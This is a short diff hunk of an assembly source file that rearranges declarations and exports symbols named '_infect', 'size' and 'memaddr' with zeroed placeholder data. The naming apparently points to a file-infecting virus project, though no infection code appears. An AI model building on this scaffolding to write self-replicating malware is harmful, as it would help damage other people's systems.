@@ -1,10 +1,10 @@
-extern entry
-
 section .text
 global _infect
 global size
 global memaddr
+extern entry
 
+start:
 size: db `0000000000000000`
 memaddr: db `0000000000000000`
 
